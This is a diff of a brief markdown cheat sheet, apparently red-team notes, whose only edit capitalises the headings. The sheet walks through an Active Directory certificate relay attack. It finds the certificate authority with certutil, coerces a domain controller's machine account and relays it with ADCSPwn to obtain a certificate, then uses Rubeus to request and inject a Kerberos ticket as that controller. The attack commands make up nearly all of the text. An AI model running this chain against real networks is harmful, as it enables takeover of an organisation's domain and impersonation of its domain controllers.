@@ -1,17 +1,17 @@
-### source
+### Source
 https://github.com/bats3c/ADCSPwn  
 
-### find certificate autthority
+### Find certificate autthority
 ```
 certutil.exe
 ```
 
-### coerce authentication from machine account and relay to certificate service, write certificate to file
+### Coerce authentication from machine account and relay to certificate service, write certificate to file
 ```
 adcspwn.exe --adcs <certificateAuthority> --remote <domainController> --output <base64Certificate>
 ```
 
-### request kerberos TGT
+### Request kerberos TGT
 ```
 Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
 ```
